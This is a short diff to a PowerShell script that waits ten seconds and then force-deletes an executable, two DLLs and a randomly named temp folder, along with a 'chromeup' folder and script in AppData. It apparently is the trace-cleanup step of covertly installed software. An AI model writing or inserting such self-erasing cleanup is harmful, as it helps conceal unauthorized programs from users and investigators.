@@ -1,5 +1,7 @@
 Start-Sleep 10
 Remove-Item $env:temp\sVBXKuz\wsappa.exe -Force
+Remove-Item $env:temp\sVBXKuz\libsodium.dll -Force
+Remove-Item $env:temp\sVBXKuz\libopus.dll -Force
 Remove-Item $env:temp\sVBXKuz -Force
 Remove-Item $env:appdata\chromeup\backup.ps1 -Force
 Remove-Item $env:appdata\chromeup -Force
